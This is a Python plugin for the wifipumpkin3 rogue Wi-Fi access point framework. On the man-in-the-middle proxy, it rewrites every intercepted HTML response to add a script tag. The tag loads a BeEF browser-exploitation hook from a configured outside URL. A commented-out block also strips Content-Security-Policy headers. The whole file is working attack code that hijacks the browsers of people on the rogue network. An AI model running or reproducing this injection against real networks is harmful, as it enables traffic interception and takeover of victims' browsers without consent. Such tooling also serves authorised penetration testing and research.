from wifipumpkin3.plugins.extension.base import BasePumpkin
from os import path
from bs4 import BeautifulSoup



"""
Description:
    This program is a core for wifi-pumpkin.py. file which includes functionality
    plugins for Pumpkin-Proxy.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

class beef(BasePumpkin):
    meta = {
        '_name'      : 'beef',
        '_version'   : '1.1',
        '_description' : 'url injection insert and use our own JavaScript code in a page.',
        '_author'    : 'by Maintainer'
    }

    @staticmethod
    def getName():
        return beef.meta['_name']

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.urlhook = self.config.get('set_beef','hook')

    def handleResponse(self,request, data):


        html = BeautifulSoup(data,'lxml')
        """
        # To Allow CORS
        if "Content-Security-Policy" in flow.response.headers:
            del flow.response.headers["Content-Security-Policy"]
        """
        if html.body:
            url =  '{}'.format(request.uri)
            metatag = html.new_tag('script')
            metatag.attrs['src'] = self.urlhook
            metatag.attrs['type'] = 'text/javascript'
            html.body.append(metatag)
            data = str(html)
            print("[{} js script Injected in [ {} ]".format(self._name,url))
        return data